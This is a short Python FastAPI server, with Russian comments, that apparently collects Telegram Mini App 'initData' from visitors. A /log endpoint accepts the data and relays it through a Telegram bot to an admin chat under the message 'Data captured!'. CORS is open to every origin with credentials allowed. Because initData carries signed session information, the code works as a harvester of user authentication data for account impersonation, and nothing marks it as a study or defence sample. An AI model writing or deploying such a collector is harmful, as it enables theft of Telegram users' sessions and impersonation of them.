from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import requests
import os

app = FastAPI()

# Разрешаем Mini App отправлять данные на этот сервер
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Загружаем настройки из Environment Variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

@app.post("/log")
async def log_data(request: Request):
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        # Отправляем уведомление в Telegram
        msg = f"✅ **Данные захвачены!**\n\n`{init_data}`"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        requests.post(url, json={
            "chat_id": ADMIN_ID,
            "text": msg,
            "parse_mode": "Markdown"
        })
        
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/")
async def root():
    return {"message": "Server is running!"}
